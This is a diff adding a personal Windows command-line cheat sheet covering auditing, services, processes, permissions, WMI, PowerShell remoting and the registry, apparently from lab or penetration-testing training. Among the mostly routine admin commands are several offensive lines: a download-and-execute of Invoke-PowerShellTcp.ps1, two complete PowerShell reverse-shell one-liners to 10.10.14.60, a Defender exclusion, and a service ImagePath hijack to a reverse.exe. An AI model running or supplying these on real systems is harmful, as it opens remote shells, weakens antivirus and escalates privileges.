@@ -1,0 +1,563 @@
+{{{ ###Auditing
+{{{ #AuditPol
+	- Get Policy config 
+		$ auditpol /get /category:*
+	- Get Policies 
+		$ auditpol /list /category | findstr -i use 
+	- Get Policies per user 
+		$ auditpol /get /user:skeeter /category:*
+	
+	- Enable a Policy 
+		$ auditpol /set /category:"Privilege Use",system /success:enable
+		$ auditpol /set /category:"Logon/Logoff" /success:enable /failure:enable
+
+}}} #
+{{{ #wevtutil
+	- Get last 10 system logs
+		$ wevtutil qe system /C:10 /rd
+	- Get file date and time (In UTC)
+		$ wevtutil qe Application /q:*[System[(EventID=11707)]] | findstr WinZip 	#Install Date and Time in UTC
+	- Get login/logon info
+		$ wevtutil qe security /q:"*[System/EventID=4625]" /C:50 /rd:true #Failed Login (Newest First)
+		$ wevtutil qe security /q:"*[System/EventID=4624]" /C:70 /rd:true #Succesful Login
+		$ wevtutil qe security /q:"*[System/EventID=4625]" /C:1 /rd:False | findstr -in Administrator #Failed Login (Oldest First)
+	
+}}} #
+{{{ #psloglist
+	- Get last 10 system logs 
+		$ psloglist -n 10 system  
+	- Get users latest entries
+		$ wmic useraccount where name='skeeter' get sid
+		$ psloglist -s -t "\t" -n 20 security | findstr /n /i ".*<Users SID>.*"
+	- Get EID once added to a group 
+		$ psloglist -s -t "\t" -n 20 security | findstr /n /i ".*<Users SID>.*" | findstr -i "administrators"
+		
+}}} #
+
+}}} ###
+{{{ ###Boot
+{{{ #BCDEDIT (Vista +)
+		- cmd
+			- Export to BCD store to file 
+				$ bcdedit /export "C:\BCDStoreBackup.db"
+			- Import a BCD store from file
+				$ bcdedit /import "C:\BCDStoreBackup.db"
+			- Get configuration
+				$ bcdedit /enum /v
+			- Edit  default time-out
+				$ bcdedit /timeout 180
+			- Edit default boot Operating System
+				$ bcdedit /default {guid}
+				$$ bcdedit /default {d003984d-3f81-11e4-bd45-85f6704e5b92}
+			- Edit Operating System Configuration
+				$ bcdedit /set description "YeetCannon"
+				$$ bcdedit /set description "Primary Operating System"
+			- Edit display order
+				$ bcdedit /displayorder {guid} {guid}
+			- Delete an OS Boot Option
+				$ bcdedit /delete {guid}
+	}}} #		
+
+}}} ###
+{{{ ###Drivers
+	- Get Installed Drivers
+		$ driverquery
+	- Get signed drivers
+		$ driverquery /SI
+	- Get driver link date (linkdate)
+		$ driverquery | findstr -i drivername
+
+	- Regex For Zeroed Out Drivers
+		- .*0\s+0\s+0\s+0\s+.*
+
+}}} ###
+{{{ ###File Movement
+	- Powershell Script into memory 
+		$ powershell.exe -exec Bypass "IEX (New-Object Net.WebClient).DownloadString('http://10.11.0.186:80/Invoke-PowerShellTcp.ps1')"
+
+}}} ###
+{{{ ###Filesystem
+	- Get total file size in directory 
+		$ dir /a /s  
+	- Create Share Directory
+		$ net share SharedResources=C:\Resources /remark:"For sharing stuff"
+	- Connect to Remote Share 
+		$ net use K:\ \\192.168.11.81\TempShare
+		$ new-psdrive -Name "x" -PSProvider "FileSystem" -Root "\\10.10.14.60\yeet"  
+		
+}}} ###
+{{{ ###Other
+{{{ #Lock Workstation
+	> c:\windows\system32\rundll32.exe user32.dll,LockWorkStation
+}}} #
+{{{ #nc shell One-Liner in CMD
+	$ powershell -nop -exec bypass -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.60',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+}}} #
+{{{ #nc shell One-Liner in PowerShell
+	$ $client = New-Object System.Net.Sockets.TCPClient('10.10.14.60',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+
+}}} #
+{{{ #Exclude Folder From Real Time Protection
+	$ Add-MpPreference -ExclusionPath "c:\tools"	#Windows defender suite?
+
+}}} #
+{{{ #Locate Stuff
+	$ where /R c:\windows bash.exe
+	$ dir /S -ifilter "FatDeer.png"
+}}} #
+{{{ #Open a new command windows
+	$ start cmd
+	$ start powershell
+	$ start wmi
+}}} #
+
+}}} ###
+{{{ ###Permissions 
+{{{ #cacls
+	$ cacls "c:\The Stooges\Larry" /e /g Larry:F
+}}} #
+{{{ #icacls
+	- View all icacls permissions
+		$ icacls C:\Ledge /t
+	- Disable inheritance in this directory only (sub-directories can gain inheritance from this dir)
+		$ icacls "c:\The Ducks" /inheritance:d
+	- Remove a user/group from acl
+		$icacls "c:\The Ducks\file.txt" /remove "Authenticated Users"
+	- Remove inheritance
+		$ icacls "c:\The Ducks\file.txt" /inheritance:d
+	- Grant Full permissions to a dir
+		$ icacls "c:\The Ducks" /grant "Fred":(OI)(CI)F 	
+	- Grant Write permissions to a dir
+		$ icacls "c:\The Ducks\Huey" /grant Fred:(OI)(CI)(W)
+	- Grant Full permissions to a file 
+		$ icacls "c:\The Ducks\Fred\Fred.txt" /grant Fred:F
+}}} #
+{{{ #takeown
+	- take ownership of a file
+		$ takeown /F C:\filename
+
+}}} #
+https://superuser.com/questions/322423/explain-the-output-of-icacls-exe-line-by-line-item-by-item
+
+}}} ###
+{{{ ###Processes
+{{{ #TaskList & TaskKill Examples
+# TaskList
+	- View Process's that are hosting a service 
+		$ tasklist /svc
+	- View DLL's Loaded By each Process
+		$ Tasklist /m
+	- Verbose output
+		$ Tasklist /v
+	- get remote Process List
+		$ tasklist /s system /u domain\username /p password
+		$$ tasklist /S 192.168.11.18 /U Administrator /P L33tHax0r
+	- Filter tasklist output
+		$$ tasklist /fi "SESSION eq 1"
+		$$ tasklist /fi "MEMUSAGE gt 15000"
+	- Get Process owner 
+		$ tasklist /v | findstr -r "Local Service"
+# TaskKill
+	- Kill a process by Image Name
+		$$ taskkill /IM notepad.exe
+	- Kill a remote process 
+		$$ taskkill /s 192.168.11.18 /u win10\administrator /p L33tHax0r /PID 3604
+	
+		
+}}} #
+{{{ #Handle
+	- Handles of a process
+		$$ handle -p notepad.exe
+		# The first piece of information is the image name of the process, followed by its process ID and the identity of the account that launched the process. Next, the handles associated with this process are listed according to their handle value (a hexadecimal number), the type of object the handle is associated with, and the name of the object (if one exists).
+	- Dump ALL handle info of a process 
+		$$ handle -a -p 2860
+		
+	- List handles in "music"
+		$$ handle -a music
+		
+}}} #
+{{{ #pslist & pskill Examples 
+	- Sysinternals only
+# pslist
+	- View Thread and Memory Details
+		$ pslist -md
+		$ pslist -x 
+	- View Parent-Child relationship in tree format
+		$ pslist -t 
+	- View pslist in "Manager Mode" (active update)
+		$ pslist -s 120 -r 3
+	- Remote 
+		$ pslist \\computer -u username -p password
+		$$ pslist \\192.168.11.18 -u Administrator -p L33tHax0r
+
+# pskill
+	- Kill process and decendents
+		$ pskill -t 123
+	- Kill remote process 
+		$ pskill \\192.168.11.18 -u .\Administrator -p L33tHax0r notepad.exe
+		
+}}} #
+{{{ #dlls
+	- list dlls of a process
+		$$ listdlls cmd.exe
+		$$ listdlls 1812
+	- list processes that loaded a dll
+		$$ listdlls -d WOW64.dll
+	- List dlls with "defender" in the name (name=path also)
+		$$ listdlls -d defender
+	- list unsigned dlls
+		$ listdlls -u
+	- list dll version
+		$$ listdlls -v wow64.dll
+	- list dll install date
+		$$ listdlls -v -d gdi32.dll			#Can take over a minute to return results
+}}} #
+
+}}} ###
+{{{ ###Services
+{{{ #Other
+	- get key name
+		$ sc getkeyname "Display Name"
+		$$ sc \\xp.ops.local getkeyname "Windows Firewall/Internet Connection Sharing (ICS)"
+		$$ psservice config "Parental Controls"
+
+}}} #
+{{{ #List Service
+	- List all services 
+		$ sc query 
+		$ psservice
+		$$ psservice \\xp.ops.local -u xp\administrator -p L33tHax0r query -s all
+		$ wmic service get displayname,state
+		
+	- List service status
+		$$ sc query tlntsvr 
+		$$ sc queryex tlntsvr 								#This will get you the PID and extra info
+		$$ sc \\xp.ops.local query sharedaccess				#Remote
+		$$ psservice \\xp.ops.local -u xp\administrator -p L33tHax0r query "Security Center"		#Remote
+		
+	- List runnning services 
+		$ net start 
+		$ psservice query -s active
+		
+	- List Service configs
+		$$ sc qc tlntsvr
+		$$ psservice config "Windows event collector"
+		
+	- List Services a Service depends on
+		$$ sc qc lanmanworkstation
+		$$ psservice config "Windows event collector"
+	
+	- List Services that Depend on a Service
+		$$ sc enumdepend lanmanworkstation 
+		
+	- List Service failure (start failure)
+		$$ sc qfailure wuauserv
+		
+	- List Service security permissions (service permissions)
+		$$psservice security "appinfo"
+		
+	- Map service to PID 
+		$ sc queryex state= all
+		
+}}} #	
+{{{ #Change Service status (start/stop/Pause/continue)
+	- Start servcies
+		$$ net start "Print Spooler"
+		
+	- Stop services
+		$$ sc stop w32time
+		$$ psservice stop "windows time"
+		
+	- Pause service
+		$$ net pause telnet
+		$$ sc pause tlntsvr
+		
+	- Continue (unpause) service 
+		$$ net continue telnet 
+		$$ sc continue tlntsvr
+		
+}}} #
+{{{ #Edit Service Configs
+	- Edit a service start type 
+		$$ sc config netlogon start= disabled
+		$ psservice setconfig \\Computer -u Username -p password "Security Center" disabled -accepteula
+
+			
+}}} #
+
+}}} ###
+{{{ ###Tool Syntax
+{{{ #DsTools 
+# https://web.archive.org/web/20160609093604/https://technet.microsoft.com/en-us/library/cc730720.aspx
+	- Determine of a computer is part of a domain
+		$ dsquery computer domainroot -name "wkstation08"
+	- list operating systems on the domain 	
+		$ dsquery * -attr operatingSystem operatingSystemServicePack -filter "(|(operatingSystem=*))"
+		
+	$ dsquery computer domainroot -name DC
+	$ dsget user "CN=Christina Coffey,CN=Users,DC=corp,DC=skyriver,DC=com"
+	$ dsquery computer | dsget comuter -samid
+	$ dsquery user -name *phillips | dsget user -samid -upn
+	$ dsquery user -name *phillips | dsget user -memberof
+	$ dsquery group "CN=Domain Admins,CN=Users,DC=corp,DC=skyriver,DC=com" | dsget group -members
+	
+	$ dsquery user -name *carpenter* | dsmod user -desc "Field Manager"
+	$ dsquery group "CN=managers,CN=Users,DC=corp,DC=skyriver,DC=com" | dsmod group -addmbr "CN=Bob Carpenter,CN=Users,DC=corp,DC=skyriver,DC=com"
+	$ dsquery group "CN=managers,CN=Users,DC=corp,DC=skyriver,DC=com" | dsget group -members 
+	$ dsadd user "CN=Larry Zonka,CN=users,DC=corp,DC=skyriver,DC=com" -samid lzonka -upn lzonka@ops.local -fn "Larry" -ln "Zonka" -display "Larry Zonka" -pwd L33tHax0r -desc "Cool Guy" -disabled no
+	$ dsrm "CN=Larry Zonka,CN=Users,DC=corp,DC=skyriver,DC=com" -noprompt
+
+}}} #
+{{{ #net
+	$ net user Larry L33tHax0r /add
+	$ net localgroup "Power Users" Larry /add
+	$ net user Joe /active:no
+	$ net user Moe /comment:"Leader of The Stooges"
+	$ net user Larry /times:M-Su,9AM-5PM
+	https://ss64.com/nt/netuseroptions.html
+	
+}}} #
+{{{ #Powershell
+	- Get Loaded Modules
+		$ get-module
+	- Get Loaded and Unloaded Modules 
+		$ get-module -ListAvailable
+	- Get Powershell Version 
+		$ get-host 
+	- Set Alias
+		$ set-alias -name gh -value Get-ChildItem
+	- Test network connection (ping)
+		$ test-connection 1.1.1.1
+	- Enable and Configure WinRm
+		$ winrm quickconfig -q		#You may need to setup "Trusted Hosts"
+	- Run remote Command
+		$ get-hotfix -ComputerName win7
+		$ Get-Hotfix -ComputerName win10 -Credential barney
+	- Create a credential variable
+		$c = get-credential -Computername win10 
+	- Use credential Variable
+		$ get-hotfix -computername win10 -credential $c | where {$_.Description -match "Security"}
+	- Invoke Command
+		```O
+		$ $session7 = New-PSSession -computername win7 -credential win7\administrator
+		$ invoke-command $session7 -scriptblock { get-process }
+		```C
+	- Enter Remote PSSession
+		```O
+		$ $session7 = New-PSSession -computername win7 -credential win7\administrator
+		$ Enter-PSSession -session $session7
+		$ Exit-PSSession
+		```C
+	- Remove pssession
+		$ Get-PSSession
+		$ Remove-PSSession -id 32
+	- Create cimsession (WSMAN (Powershell 3 and newer))
+		```O
+		$ $c = New-CimSession -ComputerName win10 -Credential fred
+		$ $c | Get-CimInstance -ClassName Win32_Service -filter "State like 'Running'"
+		```C
+	- Create CIMSession (DCOM (Powershell 2 and older))
+		```O
+		$ $g = get-credential
+		$ $so = new-cimsessionoption -protocol DCOM
+		$ $d = new-cimsession -computername win7 -credential $g -SessionOption $so
+		$ get-cimsession		
+		$ get-cimsession -id 6 | get-ciminstance win32_service | where {$_.state -like "Running"} | select name
+		```C
+		
+	- Enable logging for all modules 
+		$ get-module | ForEach { $_.LogPipelineExecutionDetails = $True }
+	- Get the most recent PowerShell Event Log 
+		$ Get-WinEvent -FilterHashtable @{LogName='Windows PowerShell';Id ='800'} -MaxEvents 1 | Select -Expand Message
+	- List running services 
+		$ gwmi win32_service | where {$_.state -match "Running"} | select name
+		$ gwmi Win32_Service -filter "State like 'Running'" -Credential fred -Computer win7
+	- Use WMI SQL (WSQL)
+		$ gwmi -query "select * from win32_service where state = 'Running'" | select name
+	- Get hardware serial number
+		$ Get-WmiObject -query "select * from Win32_SystemEnclosure" -ComputerName win7 -Credential $c | select SerialNumber
+		$ Get-WMIObject -query "select * from win32_bios" -computername win7 -credential $c | select serialnumber
+		$ gwmi -query "Select * from win32_bios" | finstr "^SerialNumber.*"
+	- Remove an application
+		$ (Get-WmiObject Win32_Product -computername win7 -credential $c -filter "Name like '%Ask'").Uninstall()
+		$ Get-WmiObject Win32_Product -computername -credential $c -Filter "Name like '%Ask'"
+	- Search CIMClasses
+		$ Get-CimClass | Where {$_.CimClassName -match 'User'}
+	- Look through namespaces
+		$ get-ciminstance -namespace ^TAB_Through^
+	- List all events in a log 
+		$ Get-EventLog -LogName "Windows Powershell" -After '10/20/2016 00:00:00'
+	- list all of the Alternate Data Streams for all possible files.
+		$ $(Get-PSDrive -PSProvider FileSystem).Root | Foreach { Get-ChildItem $_ -recurse | Get-Item -Stream * }
+	
+	{{{ #TroubleShoot NextCloud
+		- Get filenames and sizes 
+			$ gci -path 'C:\users\cschmid\Downloads\0104\' -recurse  | select-object -Property name,Length > 0104.size.txt
+		- Diff files 
+			$ Compare-Object (get-content .\0105.size.txt) (get-content .\0104.size.txt)
+	
+	}}} #
+		
+}}} #	
+{{{ #runs
+	$ runas /user:Larry cmd.exe
+	$ runas /user:WIN10\administrator "cmd /c echo yeet > c:\cannon.txt"
+
+}}} #
+{{{ #scp
+	- SCP with spaces in path
+		$ scp -vvv -o ControlPath=/tmp/T5 -P 5005 -r student5@127.1:'"C:\Program Files\Common Files\system\ado\*.dll"' ~/McCoy/Desktop/
+
+
+
+
+
+}}} #
+{{{ #Wmic
+	- Get all processes
+		$ wmic PROCESS
+	- Get all attributes of explorer.exe
+		$ wmic PROCESS WHERE (Descriptions="explorer.exe")
+		- WO Aliases
+		$? wmic PATH Win32_Process.Description="explorer.exe"
+	- Get certain attributes
+		$ wmic PROCESS GET Name, Handle, PageFaults
+		- WO Aliases
+		$ wmic PATH Win32_Process Get Name, Handle, PageFaults 
+	- Execute on remote system
+		$? wmic /NODE 1.1.1.1 /USER cschmid /PASSWORD L33tHax0r
+	- get powersupply status
+		$ wmic computersystem get powersupplystate /value
+	- get datafile version 
+		$ wmic datafile where name="c:\\windows\\system32\\win32k.sys" get version
+	- Enable an account
+		$ wmic useraccount where caption="wmic7\\vhalen" get set disabled=False
+	- get KB hotfix list
+		$ wmic qfe get hotfixid
+	- Get computersystem info
+		$ wmic /node:192.168.11.12 /user:xp\administrator computersystem list brief /format:list
+	- List nics 
+		$ wmic 
+	- Get clock speed
+		$ wmic path win32_processor get CurrentClockSpeed, MaxClockSpeed, Name
+	- get processor speed
+		$ wmic cpu get name
+	- get RAM quantity
+		$ wmic memorychip get devicelocator, capacity		#1073741824=1GB    https://www.google.com/search?q=wmic+find+installed+ram&ie=utf-8&oe=utf-8&client=firefox-b-1-ab
+		$ wmic computersystem get totalphysicalmemor
+	- get user\machine SIDs
+		$ wmic useraccount get name,SID
+	- get owner of a process
+		$ wmic process where "name='taskeng.exe'" call GetOwner
+	- get logged in users
+		$ wmic computersystem get username
+	- get DEP status and policy
+		$ wmic OS Get DataExecutionPrevention_Available
+		$ wmic OS Get DataExecutionPrevention_SupportPolicy
+}}} #
+
+}}} ###
+{{{ ###Working With
+{{{ #Command History
+	$ doskey /h
+	$ f7
+	$ set logfile C:\telnet.log
+	$ telnet -f out.txt
+}}} #
+{{{ #Environment Variables
+	#NOTE:
+		#setx: 
+			- You are changing permanantly 
+			- if /M is used, you are changing the system environment variable.
+			- if /M is not used you are changing the user environment.
+		#set:
+			- You are always changing your current enviroment
+	- Show environment variables
+		$ reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment"
+		$ powershell> gci env:
+		$ set 
+	- create/modify an environment variable permanantly
+		$ setx TEMP C:\MyValue
+	- for non permanant
+		$ set TEMP C:\MyValue
+	- permanant and remote
+		$ setx /s xp.ops.local /u xp\administrator /p L33tHax0r PROMPT $D$T$P
+	- permanant and remote for system
+		$ setx /s xp.ops.local /u xp\administrator /p L33tHax0r PATH "C:\systempath" /M
+	- show where winows files are located
+		$ echo %systemroot%
+	- show the \Documents and Settings\"user profile" or \Users\"user profile" in Windows Vista and later systems
+		$ echo %homepath%
+	- Make a backup of system environment variables
+		$ reg export "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" c:\system-environment-variables.reg
+
+}}} #
+{{{ #Registry
+	- Basic Syntax
+		- regfind
+			- Remote
+				$ regfind -m \\machinename
+			- Search Through key and value names 
+				$ regfind -n CompletionChar
+			- Search Through value data
+				$ regfind 192.168
+		- reg
+			- Basic syntax
+				$ reg add keyname[/v Valuename][/t Type][/d Data]
+				$$ reg add HKLM\Software\MyCo /v Data /t REG_BINARY /d fe340ead
+	- Backup Entire Registry to file
+		$ regedit -e C:\registrybackup.reg
+	- Backup Hives to file
+		$ reg save hklm\hardware C:\HKLM-hardware-BU.hiv
+	- Add a key from remote 
+		$ reg add "\\xp.ops.local\HKLM\SOFTWARE\hawkeye"
+			- and verify
+		$ reg query "\\xp.ops.local\HKLM\SOFTWARE\hawkeye"
+	- Recursively show all subkeys and values
+		 $ reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons /S
+	- Change/add a value's data
+		$ reg add HKLM\SYSTEM\CurrentControlSet\services\ServiceRegKey /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
+	- Show Ports explicitly disabled by windows firewall
+		$ reg query hklm\system\currentcontrolset\services\sharedaccess\parameters\firewallpolicy\standardprofile\globallyopenports\list
+	- Show Applications enabled via firewall	
+		$ reg query hklm\system\currentcontrolset\services\sharedaccess\parameters\firewallpolicy\standardprofile\authorizedapplications\list
+	- import a registry file
+		$ reg import C:\filename.reg TODO: verify
+}}} #
+{{{ #Boot
+	- Pre-Vista
+		- NOTE: bootcfg does not come on xp by default. (You'll have to edit boot.ini manually)
+		- Set Attributes
+			$ attrib -H -R -S C:\boot.ini
+		- open file for editing (WinVimIsh)
+			$ edit C:\boot.ini
+		- Change Default Boot partition
+			$ bootcft /default /ID 2
+	- Vista and Newer 
+		- Export the bcd store
+			$ bcdedit /export filename	
+				- NOTE: filename is the outfile
+		
+	
+}}} # 
+{{{ #Attributes
+	$ attrib -H +R -S C:\boot.ini
+		- Minus Hidden, Plus Read-Only, Minus System
+}}} #
+}}} ###
+{{{ #FAQ
+	- Get file dates/timestamps
+		$ wevtutil qe Application /q:*[System[(EventID=11707)]] | findstr WinZip 	#Install Date and Time in UTC
+		$ wmic datafile where name="C:\\program files\\vmware\\vmware tools\\vmtoolsd.exe" get Version,InstallDate,CreationDate,LastAccessed,LastModified
+		$ wmic datafile where name="C:\\windows\\system32\\cmd.exe" get Version,InstallDate			#Install date and version
+	- Get file priority 
+		$ wmic process where name="cmd.exe" get priority
+
+
+}}} ###
+
+
+
+
+
